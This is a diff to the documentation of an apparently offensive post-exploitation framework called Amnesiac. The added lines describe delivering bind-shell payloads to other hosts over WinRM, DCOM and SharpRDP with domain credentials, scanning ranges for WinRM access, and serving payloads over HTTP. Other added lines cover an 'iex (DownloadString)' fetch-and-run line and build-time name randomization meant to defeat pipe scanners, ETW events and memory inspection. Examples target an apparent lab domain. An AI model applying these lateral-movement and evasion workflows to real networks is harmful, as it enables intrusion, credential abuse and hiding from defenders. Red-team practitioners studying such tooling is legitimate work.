@@ -107,6 +107,10 @@ Four improvement layers, all changes in `Amnesiac.ps1`:
 | `artifacts` | List in-memory captured artifacts |
 | `save <type>` | Write artifact to operator disk |
 | `RunBin <name> [args]` | Reflectively load a .NET assembly in-memory (local shell + sessions) |
+| `winrm computername=<IP> username=<dom\user> password=<pass>` | Deliver bind shell payload via WinRM — no active session, no local admin, no serve needed. Requires target user in `Remote Management Users`. |
+| `winrmscan username=<dom\user> password=<pass> [range=10.x.x.1-30]` | Scan a host range for WinRM-accessible targets for the given credential. TCP-probes port 5985 first, then WSMan auth test. |
+| `dcom computername=<IP> [method=ShellWindows\|ShellBrowserWindow\|MMC20]` | Deliver bind shell via DCOM. ShellWindows/ShellBrowserWindow require no local admin — piggyback on existing `explorer.exe` (DCOM Access permission, allowed for domain users). Needs active interactive session on target + `serve` running. MMC20 requires local admin. **Note:** returns `0x80070005` when called from a non-domain-joined machine (runas /netonly) — DCOM activation is rejected at the class factory level regardless of credentials. Only reliable from a domain-joined operator machine or an existing pipe session. |
+| `servelog` | Print the serve request log (timestamped 200/404 lines, coloured by status) |
 
 ### LPE Commands (local shell + active sessions)
 
@@ -125,12 +129,31 @@ Four improvement layers, all changes in `Amnesiac.ps1`:
 
 Amnesiac shows an explicit warning when `-NoDomain` is set and reverse shell is selected: `Scenario 1 (non-domain): reverse shell requires port 445 inbound on this machine. Consider Bind Shell instead.`
 
-**Bind shell flow (Scenario 1):**
-1. Main menu → `[2] Bind Shell` → pick `stealth` payload format
-2. Deliver payload to target via WMI/SMB remoting using domain creds
-3. Target creates named pipe server on itself
-4. Amnesiac prompts for target IP — enter it to connect
-5. Session appears under `Bind Shell Sessions`
+**Bind shell flow (Scenario 1) — delivery priority:**
+
+| Priority | Command | Requires | When to use |
+|----------|---------|----------|-------------|
+| **1 — Primary** | `winrm computername=<IP> username=<user> password=<pass>` | Target user in `Remote Management Users` | No active session, no local admin, no serve — cleanest option |
+| **2 — No-admin DCOM** | `dcom computername=<IP> [method=ShellWindows]` | Active interactive session on target + `serve` running | No local admin needed; piggybacks on explorer.exe via DCOM Access permission |
+| **3 — Local admin** | `Invoke-SMBRemoting` / `Invoke-WMIRemoting` in local shell | Local admin on target | Target has no WinRM or active session but you have local admin creds |
+| **4 — Last resort** | `sharprdp computername=<IP> username=<user> password=<pass>` | Active unlocked RDP session on target + `serve` running | Only when all above are unavailable; invasive (kicks the user) |
+
+**Step-by-step (WinRM primary path):**
+1. Main menu → `[2] Bind Shell` → pick `stealth` payload format → `[2] Full command`
+2. Payload is copied to clipboard. Prompt appears:
+   ```
+    [*] Deliver: winrm computername=<IP> username=<user> password=<pass>  (preferred)
+    [D] Open local shell to deliver payload (returns here to start listener)
+    [Enter] Start listener now
+   ```
+3. Press `D` → drops into local shell. Type `winrm computername=<IP> username=DOMAIN\user password=pass`. Type `back` when done.
+4. Listener starts. Enter the target IP/hostname when prompted.
+5. Target executes payload → creates named pipe server. Amnesiac connects and session appears under `Bind Shell Sessions`.
+
+**SharpRDP last-resort (step 3 only if WinRM/SMB unavailable):**
+- Requires active, unlocked RDP session on target — invasive (kicks the session on delivery)
+- Run `serve` in local shell first (target downloads payload via HTTP)
+- Then: `sharprdp computername=<IP> username=DOMAIN\user password=pass`
 
 ## Listener UX
 
@@ -164,7 +187,7 @@ Located in `AmnesiacLoader/`. Provides:
 - Sleep masking (AES encrypt memory during dormancy)
 
 ### Build Requirements
-- .NET SDK 6.0+ (for build tooling)
+- `csc.exe` from .NET Framework 4.x (ships with Windows — no SDK needed): `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`
 - Target framework: net462 (runs on any Windows with .NET 4.6.2+)
 
 ### Build & Embed
@@ -177,7 +200,27 @@ cd AmnesiacLoader
 
 ### Pre-built
 A pre-built base64 blob is included in `Amnesiac.ps1` as `$AmnesiacLoaderB64`.
-Run `Build.ps1` only if you modify the C# source.
+Run `Build.ps1` once before an engagement. The compiled blob and name map are baked into `Amnesiac.ps1` permanently — no rebuild needed per session. Re-run only when modifying C# source or wanting fresh names before a new engagement.
+
+**Pre-engagement (one time):**
+```powershell
+cd AmnesiacLoader; .\Build.ps1   # compile + embed blob and name map into Amnesiac.ps1
+```
+After that:
+```
+Scenario 1: . .\Amnesiac.ps1; Amnesiac -NoDomain -IP <ip>
+Scenario 2: iex (DownloadString); Amnesiac   (blob already embedded in ShellReady)
+```
+
+**Auto-loader guard:** If `$AmnesiacLoaderB64` is empty when a session connects with AutoLoader ON, a warning is printed instead of silently skipping: `[!] Auto-loader: blob not embedded — run AmnesiacLoader\Build.ps1 first`. Same warning is shown when typing `autoloader on` with an empty blob.
+
+### Name Randomization (Build-Time)
+Every `Build.ps1` run randomizes the namespace, all public class names (Stomper, Injector, NativeLoader), all public method names, and all internal class names using word-boundary regex substitution on temp source copies before compiling. The compiled DLL is named `<random>.dll`. A PS-side name map block (`# !!AL-MAP-BEGIN!! ... # !!AL-MAP-END!!`) is written to both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1` containing `$_alNs`, `$_alStp`, `$_alConc`, `$_alInj`, `$_alInPS`, `$_alSpwn`, `$_alNL`, `$_alNLLd`. All pipe commands that invoke loader methods use PS reflection with these map variables — the target never sees `AmnesiacLoader`, `Stomper`, or `ConcealLoadedAssembly`.
+
+Detection surfaces eliminated:
+- Named pipe command content (pipe scanners)
+- ETW AssemblyLoad events (assembly name = random)
+- CLR heap metadata (type/method name strings)
 
 ---
 
@@ -324,6 +367,28 @@ Amnesiac-main/
 ├── CHANGELOG.md                    — change history
 └── README.md                       — original Amnesiac readme
 ```
+
+---
+
+## Local Shell — Tool Keyword Notes
+
+### `_kw` hint mechanism
+Tool-load keywords in `Start-LocalShell` support an optional `hint` field. After a keyword loads
+its tools successfully, hint strings are printed in Cyan before any auto-invoke. Add `hint=@("...")`
+to any `_kw` entry to surface usage examples on load.
+
+### SessionHunter — non-domain-joined usage
+From a `runas /netonly` machine, `$env:USERDNSDOMAIN` is null — `Invoke-SessionHunter` with no
+arguments fails with `GetDomain`. Always pass `-Domain` and `-DomainController` explicitly:
+
+```powershell
+Invoke-SessionHunter -Domain NORTH.SEVENKINGDOMS.LOCAL -DomainController 10.3.10.11
+Invoke-SessionHunter -Hunt hodor -Domain NORTH.SEVENKINGDOMS.LOCAL -DomainController 10.3.10.11
+```
+
+`NetSessionEnum` (underlying API) is admin-restricted on Server 2016+ member servers — standard
+domain users get empty results. The DC itself is more permissive. For reliable results, run from
+a session where you have local admin.
 
 ---
 
